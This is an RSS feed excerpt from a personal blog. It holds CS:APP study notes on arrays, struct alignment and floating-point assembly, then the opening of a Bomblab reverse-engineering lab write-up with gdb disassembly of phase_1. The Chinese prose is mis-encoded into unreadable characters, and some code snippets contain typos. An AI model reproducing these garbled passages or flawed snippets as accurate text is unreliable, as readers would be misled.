&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;å¤šç»´æ•°ç»„&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;	ElemType A[R][C];
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨æ•°æ®ç»“æ„ä¸­æˆ‘å·²ç»å­¦è¿‡çŸ©é˜µçš„ç›¸å…³æ“ä½œ,è·Ÿè¿™é‡Œæ˜¯è´¯é€šçš„.æ•°ç»„å¤§å°å  &lt;code&gt;R*C*sizeof(ElemType)&lt;/code&gt; å­—èŠ‚,åœ¨å†…å­˜ä¸­æŒ‰è¡Œä¸»åºå‚¨å­˜. &lt;code&gt;A[i][j]&lt;/code&gt;çš„åœ°å€æ˜¯ &lt;code&gt;A+(i*C+j)*sizeof(ElemType)&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int get_pgh_digit (int index, int dig) { 
	return pgh[index][dig]; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯¹åº”çš„æ±‡ç¼–ä»£ç &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;get_phg_digit:
	leaq (%rdi,%rdi,4), %rax   # 5*index 
	addl %rax, %rsi            # 5*index+dig
	movl phg(,%%rsi,4), %eax   # M[pgh + 4*(5*index+dig)]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦ä¸€ç§å£°æ˜æ–¹å¼æ˜¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#define UCOUNT 3
zip_dig CMU = {1,5,2,1,3};
zip_dig MIT = {0,2,1,3,9};
zip_dig UCB = {9,4,7,2,0};

zip_digt univ[UCOUNT] = {MIT, CMU, UCB};
int get_univ_digit (size_t index, size_t digit) { 
	return univ[index][digit]; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¹Ÿå¯ä»¥è¿™æ ·è¯»å–&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;get_univ_digit:
	salq    $2, %rsi                    # digit*4
	addq    univ(,%rdi,8), %rsi         # p = univ[index] + digit*4  ä¸€ä¸ªæŒ‡é’ˆçš„å¤§å°æ˜¯8å­—èŠ‚
	movl    (%rsi), %eax                # return *p
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸ç¬¬ä¸€ç§ç›¸æ¯”,è¿™ç§å¤šç»´æ•°ç»„çš„å®šä¹‰æ–¹å¼,å­˜æ”¾çš„å…ƒç´ æ˜¯æŒ‡é’ˆ,å…ƒç´ ä¸ä¸€å®šè¿ç»­.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250122114001.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;ç»“æ„ä½“&lt;/h1&gt;
&lt;h2&gt;ç»“æ„ä½“åˆ†é…ç©ºé—´&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;struct rec{
	int a[4];
	size_t i;
	struct rec *next;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250122115115.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç»“æ„ä½“åœ¨å†…å­˜ä¸­ä»¥å—å‘ˆç°,å®¹çº³æ‰€æœ‰å­—æ®µ.&lt;/li&gt;
&lt;li&gt;å­—æ®µæŒ‰ç…§å£°æ˜çš„é¡ºåºæ’åˆ—.&lt;/li&gt;
&lt;li&gt;ç¼–è¯‘å™¨å°†è¿½è¸ªæ¯ä¸ªå­—æ®µçš„èµ·å§‹ä½ç½®,ç„¶åç”Ÿæˆé€‚å½“çš„å­—èŠ‚åç§»(ç›¸å¯¹ç»“æ„ä½“åœ°å€)æ¥å¾—åˆ°ä¸åŒå­—æ®µ.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;äº§ç”Ÿç»“æ„ä½“æˆå‘˜çš„æŒ‡é’ˆ&lt;/h2&gt;
&lt;p&gt;ç¼–è¯‘å™¨èƒ½è®°ä½æ¯ä¸ªå­—æ®µèµ·å§‹çš„ä½ç½®,æ‰€ä»¥,å¯¹äºä¸Šé¢é‚£ä¸ªç»“æ„ä½“&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;get_ap:
	# r in %rdi, idx in %rsi
	leaq    (%rdi, %rsi, 4), %rax     # &amp;amp;r-&amp;gt;a[idx]
	ret

get_i:
	# r in %rdi
	movslq   16(%rdi), %rax     # i = M[r+16]

get_next:
	# r in %rdi
	movq     24(%rdi), %rax     # next = M[r+24]
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;å†…å­˜å¯¹é½&lt;/h2&gt;
&lt;p&gt;ä¸ºäº†æå‡å­˜å–æ€§èƒ½è€Œä½¿ç”¨å†…å­˜å¯¹é½.
ç¼–è¯‘å™¨å®é™…ä¼šåœ¨åˆ†é…ç©ºé—´æ—¶åœ¨æ•°æ®ç»“æ„ä¸­æ’å…¥ä¸€äº›ç©ºç™½çš„ä¸è¢«ä½¿ç”¨çš„å­—èŠ‚.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æˆ‘åœ¨ç”¨ç»“æ„ä½“è®¾è®¡IPv4æŠ¥æ–‡å¤´éƒ¨çš„æ—¶å€™å‘ç°äº†è¿™ç§ç°è±¡.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ä¸€ä¸ªè¿™æ ·çš„ç»“æ„ä½“:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;struct s1{
	char c;
	int i[2];
	double v;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨å¯¹é½ä¹‹å‰
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250122122544.png&quot; alt=&quot;&quot;&gt;
å¯¹é½ä¹‹å
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250122122616.png&quot; alt=&quot;&quot;&gt;
å…³äºå†…å­˜å¯¹é½çš„è¯¦ç»†ä»‹ç»,æˆ‘å‚è€ƒäº†&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30007037&quot;&gt;C/C++å†…å­˜å¯¹é½è¯¦è§£ - çŸ¥ä¹&lt;/a&gt;
åœ¨x86-64æœºå™¨ä¸Š,gccé»˜è®¤ &lt;code&gt;#pragma pack(8)&lt;/code&gt;,æ‰€ä»¥&amp;quot;å¯¹é½ç³»æ•°&amp;quot;æ˜¯8å­—èŠ‚.
&lt;strong&gt;æœ‰æ•ˆå¯¹é½å€¼&lt;/strong&gt;:&amp;quot;å¯¹é½ç³»æ•°&amp;quot;ä¸ç»“æ„ä½“ä¸­æœ€é•¿æ•°æ®ç±»å‹ä¸­è¾ƒå°çš„é‚£ä¸ª
ç»“æ„ä½“ç¬¬ä¸€ä¸ªæˆå‘˜çš„åç§»é‡æ˜¯0,ä»¥åæ¯ä¸ªæˆå‘˜çš„åç§»é‡æ˜¯è¯¥æˆå‘˜å¤§å°ä¸æœ‰æ•ˆå¯¹é½å€¼ä¸­è¾ƒå°çš„é‚£ä¸ªçš„æ•´æ•°å€;ç»“æ„ä½“æ€»å¤§å°ä¸ºæœ‰æ•ˆå¯¹é½å€¼çš„æ•´æ•°å€.
å¯¹å›¾ç‰‡è¿›è¡Œè§£é‡Š:æœ‰æ•ˆå¯¹é½å€¼æ˜¯8å­—èŠ‚,cæ”¾åœ¨ç¬¬ä¸€ä¸ªä½ç½®æ²¡æœ‰ç–‘è®®,ç„¶åi[0]çš„åœ°å€éœ€è¦æ˜¯4çš„å€æ•°,æ‰€ä»¥åœ¨cå’Œi[0]ä¹‹é—´å¡«å……3ä¸ªå­—èŠ‚.vçš„åœ°å€éœ€è¦æ˜¯8çš„å€æ•°,æ‰€ä»¥åœ¨i[1]å’Œvä¹‹é—´å¡«å……4ä¸ªå­—èŠ‚.
è¿™ç»™äº†æˆ‘å–æ¶ˆå†…å­˜å¯¹é½çš„æ–¹æ³•:è®¾ç½® &lt;code&gt;#pragma pack(1)&lt;/code&gt; æˆ–è€…åœ¨å®šä¹‰ç»“æ„ä½“çš„æœ€ååŠ ä¸Š &lt;code&gt;__attribute__((packed))&lt;/code&gt;ä¼šè®©è¿™ä¸ªç»“æ„ä½“å†…éƒ¨ä¸å¯¹é½.
é€šè¿‡è°ƒæ•´ç»“æ„ä½“ä¸­æˆå‘˜çš„é¡ºåº,å¯èƒ½èŠ‚çœç©ºé—´.&lt;/p&gt;
&lt;h1&gt;æµ®ç‚¹æ•°&lt;/h1&gt;
&lt;p&gt;CPUæœ‰16ä¸ªæµ®ç‚¹æ•°å¯„å­˜å™¨,éƒ½æ˜¯è°ƒç”¨è€…ä¿å­˜.
AVXæµ®ç‚¹ä½“ç³»å…è®¸æ•°æ®å­˜å‚¨åœ¨YMMå¯„å­˜å™¨ä¸­,å‘½åä¸º%ymm0 ~ %ymm15
SSEåˆ™ä½¿ç”¨%xmm0 ~ %xmm15.
æ¯ä¸ªYMMå¯„å­˜å™¨ä¿å­˜32å­—èŠ‚,ä½16å­—èŠ‚å¯ä»¥ä½œä¸ºXMMå¯„å­˜å™¨ä½¿ç”¨.
CS:APPä¹¦ä¸­è®²è§£çš„æ˜¯AVXä½“ç³»,è§†é¢‘è®²è§£çš„æ˜¯SSEä½“ç³».æˆ‘äº²è‡ªå®éªŒäº†ä¸¤è€…,å®ƒä»¬çš„æŒ‡ä»¤æ˜¯ä¸ä¸€æ ·çš„:
Ctrl+F12ç”Ÿæˆæ±‡ç¼–ä»£ç 
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250122183441.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;doubleÂ sum(doubleÂ a,doubleÂ b){  
Â Â Â Â returnÂ a+b;  
}  
  
intÂ main(){  
Â Â Â Â doubleÂ dÂ =Â 7.8;  
Â Â Â Â doubleÂ aÂ =Â 3.14;  
Â Â Â Â returnÂ sum(a,d);  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;AVXç‰ˆæœ¬
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250122182833.png&quot; alt=&quot;&quot;&gt;
(å‰”é™¤äº†å¤§é‡æ³¨é‡Šå’Œ.å¼€å¤´çš„å˜é‡)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;Â #Â optionsÂ passed:Â -mavxÂ -mtune=core2Â -march=noconaÂ -OgÂ -std=c99  
sum:  
Â Â Â Â vaddsdÂ Â Â Â %xmm1,Â %xmm0,Â %xmm0Â Â Â Â Â #Â tmp87,Â tmp86,Â tmp85  
Â Â Â Â retÂ Â Â Â Â Â Â   
main:  
Â Â Â Â subqÂ Â Â Â $40,Â %rspÂ Â Â Â Â #,  
Â Â Â Â callÂ Â Â Â __mainÂ Â Â Â Â #  
Â Â Â Â vmovsdÂ Â Â Â .LC0(%rip),Â %xmm1Â Â Â Â Â #,  
Â Â Â Â vmovsdÂ Â Â Â .LC1(%rip),Â %xmm0Â Â Â Â Â #,  
Â Â Â Â callÂ Â Â Â sumÂ Â Â Â Â #  
Â Â Â Â vcvttsd2silÂ Â Â Â %xmm0,Â %eaxÂ Â Â Â Â 
Â Â Â Â addqÂ Â Â Â $40,Â %rspÂ Â Â Â Â #,  
Â Â Â Â retÂ Â Â Â Â Â Â 
.LC0:  
Â Â Â Â .longÂ Â Â Â 858993459  
Â Â Â Â .longÂ Â Â Â 1075786547  
Â Â Â Â .alignÂ 8  
.LC1:  
Â Â Â Â .longÂ Â Â Â 1374389535  
Â Â Â Â .longÂ Â Â Â 1074339512  
Â Â Â Â .identÂ Â Â Â &amp;quot;GCC:Â (x86_64-posix-seh,Â BuiltÂ byÂ MinGW-BuildsÂ project)Â 11.4.0&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;SSEç‰ˆæœ¬
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250122183302.png&quot; alt=&quot;&quot;&gt;
(æå‡ºäº†å¤§é‡æ³¨é‡Šå’Œ.å¼€å¤´çš„å˜é‡)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;Â #Â optionsÂ passed:Â -msseÂ -mtune=core2Â -march=noconaÂ -OgÂ -std=c99  
sum:  
Â Â Â Â addsdÂ Â Â Â %xmm1,Â %xmm0Â Â Â Â Â #Â tmp87,Â tmp85  
Â Â Â Â retÂ Â Â Â Â Â Â 
main:  
Â Â Â Â subqÂ Â Â Â $40,Â %rspÂ Â Â Â Â #,  
Â Â Â Â callÂ Â Â Â __mainÂ Â Â Â Â #  
Â Â Â Â movsdÂ Â Â Â .LC0(%rip),Â %xmm1Â Â Â Â Â #,  
Â Â Â Â movsdÂ Â Â Â .LC1(%rip),Â %xmm0Â Â Â Â Â #,  
Â Â Â Â callÂ Â Â Â sumÂ Â Â Â Â #  
Â Â Â Â cvttsd2silÂ Â Â Â %xmm0,Â %eaxÂ Â Â Â Â #Â tmp87,Â &amp;lt;retval&amp;gt;  
Â Â Â Â addqÂ Â Â Â $40,Â %rspÂ Â Â Â Â #,  
Â Â Â Â retÂ Â Â  
.LC0:  
Â Â Â Â .longÂ Â Â Â 858993459  
Â Â Â Â .longÂ Â Â Â 1075786547  
Â Â Â Â .alignÂ 8  
.LC1:  
Â Â Â Â .longÂ Â Â Â 1374389535  
Â Â Â Â .longÂ Â Â Â 1074339512  
Â Â Â Â .identÂ Â Â Â &amp;quot;GCC:Â (x86_64-posix-seh,Â BuiltÂ byÂ MinGW-BuildsÂ project)Â 11.4.0&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;CS:APP 3.11ä¸­åƒæ•´æ•°é‚£æ ·è¯¦ç»†ä»‹ç»äº†æµ®ç‚¹ä»£ç ,æš‚æ—¶ç•¥è¿‡ä¸æ·±å…¥ç ”ç©¶äº†.&lt;/p&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Mon, 20 Jan 2025 16:00:00 GMT</pubDate></item><item><title>Bomblab</title><link>https://www.tankimzeg.top/blog/bomblab/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/bomblab/</guid><description>Bomblab records</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/bomblab/&quot;&gt;https://www.tankimzeg.top/blog/bomblab/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;å…¥æ‰‹å‡†å¤‡&lt;/h1&gt;
&lt;p&gt;é¦–å…ˆ,ç¡®ä¿Linuxä¸Šå®‰è£…äº†gdb:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;sudo apt update
sudo apt-get install gdb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨bomb.cæ–‡ä»¶ä¸­çš„æ˜¯main()å‡½æ•°,è¿™é‡Œæˆªå–ä¸»è¦éƒ¨åˆ†,çœ‹åˆ°ç¨‹åºé€»è¾‘:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#includeÂ &amp;lt;stdio.h&amp;gt;  
#includeÂ &amp;lt;stdlib.h&amp;gt;  
#includeÂ &amp;quot;support.h&amp;quot;  
#includeÂ &amp;quot;phases.h&amp;quot;  
  
/*Â Â *Â NoteÂ toÂ self:Â RememberÂ toÂ eraseÂ thisÂ fileÂ soÂ myÂ victimsÂ willÂ haveÂ no  
Â *Â ideaÂ whatÂ isÂ goingÂ on,Â andÂ soÂ theyÂ willÂ allÂ blowÂ upÂ inÂ a  
Â *Â spectacularyÂ fiendishÂ explosion.Â --Â Dr.Â EvilÂ Â */  
  
FILEÂ *infile;  
  
intÂ main(intÂ argc,Â charÂ *argv[])  
{  
Â Â Â Â charÂ *input;


Â Â Â Â // è¿™é‡Œç•¥å»è¾“å…¥é‡å®šå‘çš„å¤„ç†...


/*Â DoÂ allÂ sortsÂ ofÂ secretÂ stuffÂ thatÂ makesÂ theÂ bombÂ harderÂ toÂ defuse.Â */  
Â Â Â Â initialize_bomb();  
  
Â Â Â Â printf(&amp;quot;WelcomeÂ toÂ myÂ fiendishÂ littleÂ bomb.Â YouÂ haveÂ 6Â phasesÂ with\n&amp;quot;);  
Â Â Â Â printf(&amp;quot;whichÂ toÂ blowÂ yourselfÂ up.Â HaveÂ aÂ niceÂ day!\n&amp;quot;);  
  
Â Â Â Â /*Â Hmm...Â Â SixÂ phasesÂ mustÂ beÂ moreÂ secureÂ thanÂ oneÂ phase!Â */  
Â Â Â Â inputÂ =Â read_line();Â Â Â Â Â Â Â Â Â Â Â Â Â /*Â GetÂ inputÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â */  
Â Â Â Â phase_1(input);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â /*Â RunÂ theÂ phaseÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â */  
Â Â Â Â phase_defused();Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â /*Â Drat!Â Â TheyÂ figuredÂ itÂ out!  
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â *Â LetÂ meÂ knowÂ howÂ theyÂ didÂ it.Â */  
Â Â Â Â printf(&amp;quot;PhaseÂ 1Â defused.Â HowÂ aboutÂ theÂ nextÂ one?\n&amp;quot;);  
  
Â Â Â Â /*Â TheÂ secondÂ phaseÂ isÂ harder.Â Â NoÂ oneÂ willÂ everÂ figureÂ out  
Â Â Â Â Â *Â howÂ toÂ defuseÂ this...Â */  
Â Â Â Â inputÂ =Â read_line();  
Â Â Â Â phase_2(input);  
Â Â Â Â phase_defused();  
Â Â Â Â printf(&amp;quot;That&amp;#39;sÂ numberÂ 2.Â Â KeepÂ going!\n&amp;quot;);  
  
Â Â Â Â /*Â IÂ guessÂ thisÂ isÂ tooÂ easyÂ soÂ far.Â Â SomeÂ moreÂ complexÂ codeÂ will  
Â Â Â Â Â *Â confuseÂ people.Â */  
Â Â Â Â inputÂ =Â read_line();  
Â Â Â Â phase_3(input);  
Â Â Â Â phase_defused();  
Â Â Â Â printf(&amp;quot;HalfwayÂ there!\n&amp;quot;);  
  
Â Â Â Â /*Â OhÂ yeah?Â Â Well,Â howÂ goodÂ isÂ yourÂ math?Â Â TryÂ onÂ thisÂ saucyÂ problem!Â */  
Â Â Â Â inputÂ =Â read_line();  
Â Â Â Â phase_4(input);  
Â Â Â Â phase_defused();  
Â Â Â Â printf(&amp;quot;SoÂ youÂ gotÂ thatÂ one.Â Â TryÂ thisÂ one.\n&amp;quot;);  
Â Â Â Â Â Â Â Â /*Â RoundÂ andÂ &amp;#39;roundÂ inÂ memoryÂ weÂ go,Â whereÂ weÂ stop,Â theÂ bombÂ blows!Â */  
Â Â Â Â inputÂ =Â read_line();  
Â Â Â Â phase_5(input);  
Â Â Â Â phase_defused();  
Â Â Â Â printf(&amp;quot;GoodÂ work!Â Â OnÂ toÂ theÂ next...\n&amp;quot;);  
  
Â Â Â Â /*Â ThisÂ phaseÂ willÂ neverÂ beÂ used,Â sinceÂ noÂ oneÂ willÂ getÂ pastÂ the  
Â Â Â Â Â *Â earlierÂ ones.Â Â ButÂ justÂ inÂ case,Â makeÂ thisÂ oneÂ extraÂ hard.Â */  
Â Â Â Â inputÂ =Â read_line();  
Â Â Â Â phase_6(input);  
Â Â Â Â phase_defused();  
  
Â Â Â Â /*Â Wow,Â theyÂ gotÂ it!Â Â ButÂ isn&amp;#39;tÂ something...Â missing?Â Â Perhaps  
Â Â Â Â Â *Â somethingÂ theyÂ overlooked?Â Â MuaÂ haÂ haÂ haÂ ha!Â */  
Â Â Â Â Â Â Â Â returnÂ 0;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ˜¾ç„¶,è§£è°œè¦ç‚¹éšè—åœ¨&lt;code&gt;phase_1&lt;/code&gt;, &lt;code&gt;phase_2&lt;/code&gt;,..., &lt;code&gt;phase_6&lt;/code&gt;ä¸­&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gdb bomb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è®¾ç½®æ–­ç‚¹,é˜»æ­¢ç‚¸å¼¹çˆ†ç‚¸:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) b explode_bomb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™æ˜¯explode_bombä»£ç ,ä¸å†æ·±ç©¶:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble explode_bomb
Dump of assembler code for function explode_bomb:
   0x000000000040143a &amp;lt;+0&amp;gt;:     sub    $0x8,%rsp
   0x000000000040143e &amp;lt;+4&amp;gt;:     mov    $0x4025a3,%edi
   0x0000000000401443 &amp;lt;+9&amp;gt;:     call   0x400b10 &amp;lt;puts@plt&amp;gt;
   0x0000000000401448 &amp;lt;+14&amp;gt;:    mov    $0x4025ac,%edi
   0x000000000040144d &amp;lt;+19&amp;gt;:    call   0x400b10 &amp;lt;puts@plt&amp;gt;
   0x0000000000401452 &amp;lt;+24&amp;gt;:    mov    $0x8,%edi
   0x0000000000401457 &amp;lt;+29&amp;gt;:    call   0x400c20 &amp;lt;exit@plt&amp;gt;
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œç¨‹åº:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb)r
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;phase_1&lt;/h1&gt;
&lt;p&gt;åœ¨gdbä¸­ä½¿ç”¨åæ±‡ç¼–å·¥å…·&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb)disasemble phase_1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¾—åˆ°åæ±‡ç¼–ç»“æœ:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;Dump of assembler code for function phase_1:
   0x00400ee0 &amp;lt;+0&amp;gt;:     sub    $0x8,%rsp
   0x00400ee4 &amp;lt;+4&amp;gt;:     mov    $0x402400,%esi
   0x00400ee9 &amp;lt;+9&amp;gt;:     call   0x401338 &amp;lt;strings_not_equal&amp;gt;
   0x00400eee &amp;lt;+14&amp;gt;:    test   %eax,%eax
   0x00400ef0 &amp;lt;+16&amp;gt;:    je     0x400ef7 &amp;lt;phase_1+23&amp;gt;
   0x00400ef2 &amp;lt;+18&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x00400ef7 &amp;lt;+23&amp;gt;:    add    $0x8,%rsp
   0x00400efb &amp;lt;+27&amp;gt;:    ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ³¨æ„åˆ° &lt;code&gt;test  %eax, %eax&lt;/code&gt;,å½“%eax=0çš„æ—¶å€™ä¼šæ‰§è¡Œ &lt;code&gt;je&lt;/code&gt;,è·³è¿‡explor_bombå‡½æ•°,è§£å¼€ç‚¸å¼¹
%esiçš„å€¼æ˜¯0x00402400(32bits)
çœ‹åˆ°æœ‰ä¸€ä¸ª&lt;strings_not_equal&gt;å‡½æ•°,ç»§ç»­&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble strings_not_equal
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¾—åˆ°&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;Dump of assembler code for function strings_not_equal:
   0x00401338 &amp;lt;+0&amp;gt;:     push   %r12
   0x0040133a &amp;lt;+2&amp;gt;:     push   %rbp
   0x0040133b &amp;lt;+3&amp;gt;:     push   %rbx
   0x0040133c &amp;lt;+4&amp;gt;:     mov    %rdi,%rbx                         # %rdiæ˜¯å­˜æ”¾inputæŒ‡é’ˆ,å…ˆå¤åˆ¶åˆ°%rbx
   0x0040133f &amp;lt;+7&amp;gt;:     mov    %rsi,%rbp                         # %rbpå¤åˆ¶ä¸º0x402400
   0x00401342 &amp;lt;+10&amp;gt;:    call   0x40131b &amp;lt;string_length&amp;gt;
   0x00401347 &amp;lt;+15&amp;gt;:    mov    %eax,%r12d                        # inputå­—ç¬¦ä¸²çš„é•¿åº¦å­˜æ”¾åˆ°%r12d
   0x0040134a &amp;lt;+18&amp;gt;:    mov    %rbp,%rdi                         # æŠŠ%rbpèµ‹å€¼ç»™å‡½æ•°å‚æ•°%rdi
   0x0040134d &amp;lt;+21&amp;gt;:    call   0x40131b &amp;lt;string_length&amp;gt;          # è¿”å›%rdiçš„é•¿åº¦
   0x00401352 &amp;lt;+26&amp;gt;:    mov    $0x1,%edx                         # %edxèµ‹å€¼ä¸º1
   0x00401357 &amp;lt;+31&amp;gt;:    cmp    %eax,%r12d                        # 0x402400å­—ç¬¦ä¸²çš„é•¿åº¦ä¸inputå­—ç¬¦ä¸²é•¿åº¦ç›¸æ¯”è¾ƒ
   0x0040135a &amp;lt;+34&amp;gt;:    jne    0x40139b &amp;lt;strings_not_equal+99&amp;gt;   # å¿…é¡»ç›¸ç­‰,å¦åˆ™å‡½æ•°å°†è¿”å›1
   0x0040135c &amp;lt;+36&amp;gt;:    movzbl (%rbx),%eax
   0x0040135f &amp;lt;+39&amp;gt;:    test   %al,%al
   0x00401361 &amp;lt;+41&amp;gt;:    je     0x401388 &amp;lt;strings_not_equal+80&amp;gt;
   0x00401363 &amp;lt;+43&amp;gt;:    cmp    0x0(%rbp),%al
   0x00401366 &amp;lt;+46&amp;gt;:    je     0x401372 &amp;lt;strings_not_equal+58&amp;gt;
   0x00401368 &amp;lt;+48&amp;gt;:    jmp    0x40138f &amp;lt;strings_not_equal+87&amp;gt;
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--c
   0x0040136a &amp;lt;+50&amp;gt;:    cmp    0x0(%rbp),%al
   0x0040136d &amp;lt;+53&amp;gt;:    nopl   (%rax)
   0x00401370 &amp;lt;+56&amp;gt;:    jne    0x401396 &amp;lt;strings_not_equal+94&amp;gt;
   0x00401372 &amp;lt;+58&amp;gt;:    add    $0x1,%rbx
   0x00401376 &amp;lt;+62&amp;gt;:    add    $0x1,%rbp
   0x0040137a &amp;lt;+66&amp;gt;:    movzbl (%rbx),%eax
   0x0040137d &amp;lt;+69&amp;gt;:    test   %al,%al
   0x0040137f &amp;lt;+71&amp;gt;:    jne    0x40136a &amp;lt;strings_not_equal+50&amp;gt;
   0x00401381 &amp;lt;+73&amp;gt;:    mov    $0x0,%edx
   0x00401386 &amp;lt;+78&amp;gt;:    jmp    0x40139b &amp;lt;strings_not_equal+99&amp;gt;
   0x00401388 &amp;lt;+80&amp;gt;:    mov    $0x0,%edx
   0x0040138d &amp;lt;+85&amp;gt;:    jmp    0x40139b &amp;lt;strings_not_equal+99&amp;gt;
   0x0040138f &amp;lt;+87&amp;gt;:    mov    $0x1,%edx
   0x00401394 &amp;lt;+92&amp;gt;:    jmp    0x40139b &amp;lt;strings_not_equal+99&amp;gt;
   0x00401396 &amp;lt;+94&amp;gt;:    mov    $0x1,%edx
   0x0040139b &amp;lt;+99&amp;gt;:    mov    %edx,%eax
   0x0040139d &amp;lt;+101&amp;gt;:   pop    %rbx
   0x0040139e &amp;lt;+102&amp;gt;:   pop    %rbp
   0x0040139f &amp;lt;+103&amp;gt;:   pop    %r12
   0x004013a1 &amp;lt;+105&amp;gt;:   ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;çœ‹åˆ°æœ‰ä¸€ä¸ª&lt;string_length&gt;å‡½æ•°,ç»§ç»­&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble string_length
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¾—åˆ°&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;Dump of assembler code for function string_length:
   0x0040131b &amp;lt;+0&amp;gt;:     cmpb   $0x0,(%rdi)
   0x0040131e &amp;lt;+3&amp;gt;:     je     0x401332 &amp;lt;string_length+23&amp;gt;
   0x00401320 &amp;lt;+5&amp;gt;:     mov    %rdi,%rdx
   0x00401323 &amp;lt;+8&amp;gt;:     add    $0x1,%rdx
   0x00401327 &amp;lt;+12&amp;gt;:    mov    %edx,%eax
   0x00401329 &amp;lt;+14&amp;gt;:    sub    %edi,%eax
   0x0040132b &amp;lt;+16&amp;gt;:    cmpb   $0x0,(%rdx)
   0x0040132e &amp;lt;+19&amp;gt;:    jne    0x401323 &amp;lt;string_length+8&amp;gt;
   0x00401330 &amp;lt;+21&amp;gt;:    repz ret
   0x00401332 &amp;lt;+23&amp;gt;:    mov    $0x0,%eax
   0x00401337 &amp;lt;+28&amp;gt;:    ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™æ˜¯ä¸€ä¸ªç®€å•çš„å‡½æ•°,è¿”å›%rdiæŒ‡å‘çš„å­—ç¬¦ä¸²çš„é•¿åº¦åˆ°%eax
